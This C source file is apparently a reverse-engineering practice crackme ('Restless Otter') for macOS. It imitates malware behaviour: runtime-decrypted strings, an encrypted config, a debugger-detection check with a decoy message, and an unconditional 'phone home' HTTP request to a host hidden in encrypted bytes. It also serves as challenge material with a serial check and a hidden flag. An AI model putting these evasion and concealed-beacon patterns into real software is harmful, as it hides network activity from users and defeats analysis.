#define _POSIX_C_SOURCE 200112L
#if defined(__APPLE__)
#define _DARWIN_C_SOURCE
#endif

/*
 * Restless Otter: a benign macOS-oriented crackme for RE practice.
 * Application-controlled runtime strings are stored as encrypted bytes
 * and decoded only at runtime.
 */

#include <arpa/inet.h>
#include <netdb.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#if defined(__APPLE__)
#include <sys/sysctl.h>
#include <sys/proc.h>
#endif

#ifndef P_TRACED
#define P_TRACED 0x00000800
#endif

#ifndef RO_VERBOSE
#define RO_VERBOSE 0
#endif

static const uint8_t S_BANNER[] = {
    0x4a,0xa6,0xa0,0xfe,0x12,0x48,0xe6,0x03,0x23,0xc3,0x0b,0x83,
    0xb8,0xe9,0xff,0x87,0xfe,0x2b,0xbb,0xaf,0x3b,0x35,0x6f,0xc0,
    0x5b,0x53,0x13,0x8e,0x21,0x55,0x58,0xf0,0x04,0x31,0x89
};
#define S_BANNER_LEN 35
#define S_BANNER_SEED 0x31

static const uint8_t S_USAGE_A[] = {
    0x38,0x0d,0xc9,0x06,0x4e,0x4a,0x3a
};
#define S_USAGE_A_LEN 7
#define S_USAGE_A_SEED 0x46

static const uint8_t S_USAGE_B[] = {
    0xd9,0x5e,0x28,0x04,0xdc,0x27,0xf3,0x27,0x33,0x1c
};
#define S_USAGE_B_LEN 10
#define S_USAGE_B_SEED 0x52

static const uint8_t S_CFG[] = {
    0x5a,0x62,0x2a,0x44,0x45,0x00,0x42,0xca,0x3e,0x84,0x97,0x72,
    0x57,0x5c,0x62,0xc9,0x5a,0x04,0x95,0xa0,0x2d,0xe0,0xf8,0x32,
    0x50,0x8a,0xb0,0x01,0x24,0x8a,0xda,0x2a,0x0e,0xb8,0x27,0x23,
    0x67,0xba,0x80,0x0d,0xc7,0x6c,0x95,0x0d,0x0d,0xa4,0x11,0x9f,
    0x95,0xe5,0x94,0x8a,0x61,0x6b,0x1a,0x49,0x80,0xc4,0xa9,0xfd,
    0xc8,0x3e,0x77,0x85,0x3d,0xc1,0x42,0x31,0x7f,0x62,0x25,0xaa,
    0xcb,0xa3,0xb0,0x4f,0x60,0xff,0x8a,0x21,0x79,0x2a,0xb5,0xdc,
    0x55,0x9d,0xce,0x9a,0xbf,0x7b,0x02,0xb7,0xd2,0x3b
};
#define S_CFG_LEN 94
#define S_CFG_SEED 0x77

static const uint8_t S_RESOLVE[] = {
    0xf5,0xdb,0x90,0x1c,0xfe,0x16,0xd4,0xed,0x8e,0x93,0x00,0x26,
    0xdf,0x1f
};
#define S_RESOLVE_LEN 14
#define S_RESOLVE_SEED 0x83

static const uint8_t S_DOTS[] = {
    0x5f,0x8e,0x70,0x81,0x1d
};
#define S_DOTS_LEN 5
#define S_DOTS_SEED 0x94

static const uint8_t S_RESOLVED[] = {
    0xfa,0x36,0x50,0x75,0x82,0xab,0x60,0x84,0x36
};
#define S_RESOLVED_LEN 9
#define S_RESOLVED_SEED 0xa1

static const uint8_t S_FAILED[] = {
    0xa4,0xbc,0x00,0x6c,0x4d,0x33,0x51
};
#define S_FAILED_LEN 7
#define S_FAILED_SEED 0xa7

static const uint8_t S_PHONE[] = {
    0x02,0x28,0xe1,0xad,0x6f,0x84,0x99,0x9d,0x84,0x98,0xff,0x39,
    0x43,0xe7,0x47,0x52,0x91,0x2e,0xeb,0xa5
};
#define S_PHONE_LEN 20
#define S_PHONE_SEED 0xb2

static const uint8_t S_GOT[] = {
    0xd7,0x24,0x2f,0x52
};
#define S_GOT_LEN 4
#define S_GOT_SEED 0xb9

static const uint8_t S_BYTES[] = {
    0x88,0x51,0x3a,0x0e,0xeb,0xce,0x2f
};
#define S_BYTES_LEN 7
#define S_BYTES_SEED 0xc1

static const uint8_t S_NO_RESPONSE[] = {
    0xed,0x13,0xca,0x91,0x0c,0x05,0x2c,0xa6,0xa9,0x13,0x23,0x05
};
#define S_NO_RESPONSE_LEN 12
#define S_NO_RESPONSE_SEED 0xc8

static const uint8_t S_SOCKET_FAILED[] = {
    0x4c,0x0f,0xfd,0x84,0x98,0x36,0xc8,0xbb,0x32,0x7d,0xd6,0x5e,
    0x2d,0x24
};
#define S_SOCKET_FAILED_LEN 14
#define S_SOCKET_FAILED_SEED 0xd4

static const uint8_t S_CONNECT_FAILED[] = {
    0xe9,0xfa,0xcf,0x36,0xb5,0x7c,0xf7,0x06,0x58,0x28,0xe4,0xd8,
    0x39,0xff,0x9d
};
#define S_CONNECT_FAILED_LEN 15
#define S_CONNECT_FAILED_SEED 0xdf

static const uint8_t S_GET[] = {
    0x49,0xd4,0x79,0x7c
};
#define S_GET_LEN 4
#define S_GET_SEED 0xe3

static const uint8_t S_HTTP_HOST[] = {
    0x9a,0xcd,0x85,0x1c,0xb0,0xc0,0xa2,0x18,0xfe,0x74,0x77,0xec,
    0x23,0xf8,0xf3,0x40,0x72
};
#define S_HTTP_HOST_LEN 17
#define S_HTTP_HOST_SEED 0xef

static const uint8_t S_UA[] = {
    0xd2,0x4a,0xeb,0xbc,0xf8,0x50,0x25,0x7c,0x14,0x51,0xf4,0x2f,
    0x93,0xee
};
#define S_UA_LEN 14
#define S_UA_SEED 0xf4

static const uint8_t S_CONN_CLOSE[] = {
    0x91,0xe5,0x7c,0xc1,0xb4,0x2f,0x6c,0x7f,0x44,0xfa,0x74,0x94,
    0x6c,0x0d,0x4e,0xfc,0x1b,0x74,0x62,0x6b,0x78,0x24,0x2b
};
#define S_CONN_CLOSE_LEN 23
#define S_CONN_CLOSE_SEED 0x15

static const uint8_t S_DEBUG[] = {
    0x5b,0xfa,0xf6,0xa2,0x02,0x30,0xff,0x1d,0x23,0xd8,0xe2,0x9c,
    0xe2,0xa5,0xe4,0xc8,0xbd,0x70,0xe7,0x1f,0x7a,0x33,0x75
};
#define S_DEBUG_LEN 23
#define S_DEBUG_SEED 0x29

static const uint8_t S_ACCEPT[] = {
    0x3a,0x90,0xf0,0xaf,0x56,0x51,0xc4,0x1b,0x3f,0xca,0x03,0x3e,
    0x53,0x92,0x12,0xa9,0x58,0x57,0x06,0xee,0x20,0x07
};
#define S_ACCEPT_LEN 22
#define S_ACCEPT_SEED 0x39

static const uint8_t S_INCORRECT[] = {
    0x22,0xe8,0xee,0xa7,0x2e,0x54,0xcb,0x23,0x33,0xd5,0x1d,0x73,
    0x59,0x8d,0x59,0xb0,0x49,0x48,0x00,0xf7,0x72,0x2b,0x5d
};
#define S_INCORRECT_LEN 23
#define S_INCORRECT_SEED 0x41

static const uint8_t S_DECOY[] = {
    0x06,0xd8,0x1c,0x85,0xde,0x5c,0x04,0xf4,0xa1,0x14,0x97,0x77,
    0xdd,0xda,0x8c,0x95
};
#define S_DECOY_LEN 16
#define S_DECOY_SEED 0x5d

static const uint8_t S_NEWLINE[] = {
    0x6f
};
#define S_NEWLINE_LEN 1
#define S_NEWLINE_SEED 0x6e

static const uint8_t S_PORT[] = {
    0xd7,0x20
};
#define S_PORT_LEN 2
#define S_PORT_SEED 0x24

static const uint8_t SERIAL_TABLE[] = {
    0x70,0xc4,0x82,0x56,0x8c,0x26,0x34,0x21,0xfd,0xab,0xd7,0x0c,
    0x3b,0x85,0x49,0x7d
};
#define SERIAL_TABLE_LEN 16
#define SERIAL_ACC 0x7c539eb9u

static const uint8_t FLAG_BLOB[] = {
    0xff,0xa9,0xb7,0x10,0xa6,0x89,0x20,0x19,0x62,0xd2,0x0a,0x1d,
    0x87,0xfe,0x8d,0xd2,0x37,0xbb,0x1a,0x81,0xb2
};
#define FLAG_BLOB_LEN 21
#define FLAG_SEED 0x9b

struct ro_cfg {
    char host[64];
    char path[96];
    char dns[64];
    char campaign[64];
    char agent[64];
};

static uint8_t ro_key_step(uint8_t *state, size_t i) {
    *state = (uint8_t)((uint32_t)(*state) * 33u + 17u + (uint8_t)i);
    return (uint8_t)(*state ^ (uint8_t)(i * 29u + 0x5au));
}

/* Keep optimized builds from folding decoded strings into plaintext constants. */
#if defined(__GNUC__) || defined(__clang__)
__attribute__((noinline))
#endif
static void ro_decode(char *out, const uint8_t *in, size_t len, uint8_t seed) {
    uint8_t s = seed;
    for (size_t i = 0; i < len; i++) {
        out[i] = (char)(in[i] ^ ro_key_step(&s, i));
    }
    out[len] = 0;
}

static size_t ro_len(const char *s) {
    size_t n = 0;
    while (s[n]) n++;
    return n;
}

static void ro_wipe(void *ptr, size_t len) {
    volatile uint8_t *p = (volatile uint8_t *)ptr;
    while (len--) *p++ = 0;
}

static void ro_write_all(int fd, const char *buf, size_t len) {
    while (len) {
        ssize_t n = write(fd, buf, len);
        if (n <= 0) return;
        buf += (size_t)n;
        len -= (size_t)n;
    }
}

static void ro_write_cstr(const char *s) {
    ro_write_all(1, s, ro_len(s));
}

static void ro_write_blob(const uint8_t *blob, size_t len, uint8_t seed) {
    char tmp[256];
    if (len + 1 > sizeof(tmp)) return;
    ro_decode(tmp, blob, len, seed);
    ro_write_all(1, tmp, len);
    ro_wipe(tmp, sizeof(tmp));
}

static int ro_append_raw(char *dst, size_t cap, size_t *pos, const char *src, size_t len) {
    if (*pos + len >= cap) return 0;
    memcpy(dst + *pos, src, len);
    *pos += len;
    dst[*pos] = 0;
    return 1;
}

static int ro_append_cstr(char *dst, size_t cap, size_t *pos, const char *src) {
    return ro_append_raw(dst, cap, pos, src, ro_len(src));
}

static int ro_append_blob(char *dst, size_t cap, size_t *pos,
                          const uint8_t *blob, size_t len, uint8_t seed) {
    char tmp[128];
    if (len + 1 > sizeof(tmp)) return 0;
    ro_decode(tmp, blob, len, seed);
    int ok = ro_append_raw(dst, cap, pos, tmp, len);
    ro_wipe(tmp, sizeof(tmp));
    return ok;
}

static void ro_write_u64(uint64_t v) {
    char tmp[32];
    size_t pos = sizeof(tmp);
    if (v == 0) {
        char c = (char)('0');
        ro_write_all(1, &c, 1);
        return;
    }
    while (v && pos) {
        tmp[--pos] = (char)('0' + (v % 10u));
        v /= 10u;
    }
    ro_write_all(1, tmp + pos, sizeof(tmp) - pos);
    ro_wipe(tmp, sizeof(tmp));
}

static void ro_copy_field(char *dst, size_t cap, const char *src) {
    size_t i = 0;
    if (!cap) return;
    while (src[i] && i + 1 < cap) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static void ro_parse_cfg(char *cfg, struct ro_cfg *out) {
    memset(out, 0, sizeof(*out));
    char *seg = cfg;
    while (*seg) {
        char *eq = seg;
        while (*eq && *eq != (char)('=') && *eq != (char)(';')) eq++;
        if (*eq != (char)('=')) break;
        *eq = 0;
        char *val = eq + 1;
        char *end = val;
        while (*end && *end != (char)(';')) end++;
        if (*end == (char)(';')) *end++ = 0;

        size_t k = ro_len(seg);
        if (k == 4 && seg[0] == (char)('h') && seg[1] == (char)('o') &&
            seg[2] == (char)('s') && seg[3] == (char)('t')) {
            ro_copy_field(out->host, sizeof(out->host), val);
        } else if (k == 4 && seg[0] == (char)('p') && seg[1] == (char)('a') &&
                   seg[2] == (char)('t') && seg[3] == (char)('h')) {
            ro_copy_field(out->path, sizeof(out->path), val);
        } else if (k == 3 && seg[0] == (char)('d') && seg[1] == (char)('n') &&
                   seg[2] == (char)('s')) {
            ro_copy_field(out->dns, sizeof(out->dns), val);
        } else if (k == 8 && seg[0] == (char)('c') && seg[1] == (char)('a') &&
                   seg[2] == (char)('m') && seg[3] == (char)('p')) {
            ro_copy_field(out->campaign, sizeof(out->campaign), val);
        } else if (k == 5 && seg[0] == (char)('a') && seg[1] == (char)('g') &&
                   seg[2] == (char)('e') && seg[3] == (char)('n') &&
                   seg[4] == (char)('t')) {
            ro_copy_field(out->agent, sizeof(out->agent), val);
        }
        seg = end;
    }
}

static int ro_is_debugged(void) {
#if defined(__APPLE__)
    struct kinfo_proc info;
    size_t size = sizeof(info);
    int mib[4];
    memset(&info, 0, sizeof(info));
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    if (sysctl(mib, 4, &info, &size, 0, 0) == 0) {
        return (info.kp_proc.p_flag & P_TRACED) != 0;
    }
#endif
    return 0;
}

static void ro_dns_probe(const char *host, const char *port) {
    struct addrinfo hints;
    struct addrinfo *res = 0;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (RO_VERBOSE) {
        ro_write_blob(S_RESOLVE, S_RESOLVE_LEN, S_RESOLVE_SEED);
        ro_write_cstr(host);
        ro_write_blob(S_DOTS, S_DOTS_LEN, S_DOTS_SEED);
    }
    int rc = getaddrinfo(host, port, &hints, &res);
    if (rc != 0 || !res) {
        if (RO_VERBOSE) ro_write_blob(S_FAILED, S_FAILED_LEN, S_FAILED_SEED);
        return;
    }

    char ip[INET6_ADDRSTRLEN];
    memset(ip, 0, sizeof(ip));
    void *addr = 0;
    if (res->ai_family == AF_INET) {
        addr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;
    } else if (res->ai_family == AF_INET6) {
        addr = &((struct sockaddr_in6 *)res->ai_addr)->sin6_addr;
    }
    if (addr) {
        inet_ntop(res->ai_family, addr, ip, sizeof(ip));
    }
    if (RO_VERBOSE) ro_write_blob(S_RESOLVED, S_RESOLVED_LEN, S_RESOLVED_SEED);
    freeaddrinfo(res);
}

static int ro_connect_first(const char *host, const char *port) {
    struct addrinfo hints;
    struct addrinfo *res = 0;
    struct addrinfo *cur = 0;
    int fd = -1;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
    for (cur = res; cur; cur = cur->ai_next) {
        fd = socket(cur->ai_family, cur->ai_socktype, cur->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, cur->ai_addr, cur->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

static void ro_phone_home(const struct ro_cfg *cfg, const char *port) {
    char req[768];
    char buf[256];
    size_t pos = 0;
    ssize_t got;

    if (RO_VERBOSE) {
        ro_write_blob(S_PHONE, S_PHONE_LEN, S_PHONE_SEED);
        ro_write_cstr(cfg->host);
        ro_write_blob(S_DOTS, S_DOTS_LEN, S_DOTS_SEED);
    }

    int fd = ro_connect_first(cfg->host, port);
    if (fd < 0) {
        if (RO_VERBOSE) ro_write_blob(S_CONNECT_FAILED, S_CONNECT_FAILED_LEN, S_CONNECT_FAILED_SEED);
        return;
    }

    if (!ro_append_blob(req, sizeof(req), &pos, S_GET, S_GET_LEN, S_GET_SEED) ||
        !ro_append_cstr(req, sizeof(req), &pos, cfg->path) ||
        !ro_append_blob(req, sizeof(req), &pos, S_HTTP_HOST, S_HTTP_HOST_LEN, S_HTTP_HOST_SEED) ||
        !ro_append_cstr(req, sizeof(req), &pos, cfg->host) ||
        !ro_append_blob(req, sizeof(req), &pos, S_UA, S_UA_LEN, S_UA_SEED) ||
        !ro_append_cstr(req, sizeof(req), &pos, cfg->agent) ||
        !ro_append_blob(req, sizeof(req), &pos, S_CONN_CLOSE, S_CONN_CLOSE_LEN, S_CONN_CLOSE_SEED)) {
        close(fd);
        return;
    }

    if (send(fd, req, pos, 0) < 0) {
        close(fd);
        if (RO_VERBOSE) ro_write_blob(S_SOCKET_FAILED, S_SOCKET_FAILED_LEN, S_SOCKET_FAILED_SEED);
        return;
    }
    got = recv(fd, buf, sizeof(buf), 0);
    close(fd);
    ro_wipe(req, sizeof(req));
    ro_wipe(buf, sizeof(buf));

    if (!RO_VERBOSE) return;
    if (got <= 0) {
        ro_write_blob(S_NO_RESPONSE, S_NO_RESPONSE_LEN, S_NO_RESPONSE_SEED);
    } else {
        ro_write_blob(S_GOT, S_GOT_LEN, S_GOT_SEED);
        ro_write_u64((uint64_t)got);
        ro_write_blob(S_BYTES, S_BYTES_LEN, S_BYTES_SEED);
    }
}

static uint8_t ro_rol8(uint8_t v, unsigned r) {
    return (uint8_t)((v << r) | (v >> (8u - r)));
}

static int ro_check_ticket(const char *ticket) {
    uint32_t acc = 0x6d2b79f5u;
    if (ro_len(ticket) != SERIAL_TABLE_LEN) return 0;
    for (size_t i = 0; i < SERIAL_TABLE_LEN; i++) {
        uint8_t v = (uint8_t)ticket[i];
        v = (uint8_t)(v ^ (uint8_t)(0x41u + i * 13u));
        v = (uint8_t)(v + (uint8_t)(i * 7u + 0x23u));
        v = ro_rol8(v, (unsigned)((i % 5u) + 1u));
        if (v != SERIAL_TABLE[i]) return 0;
        acc = (uint32_t)(((acc ^ v) * 0x45d9f3bu) + (uint32_t)i + 0x1337u);
    }
    return acc == SERIAL_ACC;
}

static void ro_reveal_flag(const char *ticket) {
    char flag[FLAG_BLOB_LEN + 1];
    uint8_t state = FLAG_SEED;
    for (size_t i = 0; i < FLAG_BLOB_LEN; i++) {
        uint8_t k = ro_key_step(&state, i);
        uint8_t mask = (uint8_t)(((uint8_t)ticket[i % SERIAL_TABLE_LEN] +
                                  (uint8_t)(i * 31u + 0xa7u)) ^ k);
        flag[i] = (char)(FLAG_BLOB[i] ^ mask);
    }
    flag[FLAG_BLOB_LEN] = 0;
    ro_write_cstr(flag);
    ro_write_blob(S_NEWLINE, S_NEWLINE_LEN, S_NEWLINE_SEED);
    ro_wipe(flag, sizeof(flag));
}

int main(int argc, char **argv) {
    char cfg_text[S_CFG_LEN + 1];
    char port[S_PORT_LEN + 1];
    struct ro_cfg cfg;

    ro_write_blob(S_BANNER, S_BANNER_LEN, S_BANNER_SEED);
    if (argc != 2) {
        ro_write_blob(S_USAGE_A, S_USAGE_A_LEN, S_USAGE_A_SEED);
        ro_write_cstr(argv[0]);
        ro_write_blob(S_USAGE_B, S_USAGE_B_LEN, S_USAGE_B_SEED);
        return 1;
    }

    ro_decode(cfg_text, S_CFG, S_CFG_LEN, S_CFG_SEED);
    ro_decode(port, S_PORT, S_PORT_LEN, S_PORT_SEED);

    ro_parse_cfg(cfg_text, &cfg);
    ro_dns_probe(cfg.dns, port);
    ro_dns_probe(cfg.host, port);
    ro_phone_home(&cfg, port);

    if (ro_is_debugged()) {
        ro_write_blob(S_DEBUG, S_DEBUG_LEN, S_DEBUG_SEED);
        ro_write_blob(S_DECOY, S_DECOY_LEN, S_DECOY_SEED);
        ro_write_blob(S_NEWLINE, S_NEWLINE_LEN, S_NEWLINE_SEED);
        return 2;
    }

    if (ro_check_ticket(argv[1])) {
        ro_write_blob(S_ACCEPT, S_ACCEPT_LEN, S_ACCEPT_SEED);
        ro_reveal_flag(argv[1]);
    } else {
        ro_write_blob(S_INCORRECT, S_INCORRECT_LEN, S_INCORRECT_SEED);
        ro_write_blob(S_DECOY, S_DECOY_LEN, S_DECOY_SEED);
        ro_write_blob(S_NEWLINE, S_NEWLINE_LEN, S_NEWLINE_SEED);
    }

    ro_wipe(cfg_text, sizeof(cfg_text));
    ro_wipe(port, sizeof(port));
    ro_wipe(&cfg, sizeof(cfg));
    return 0;
}
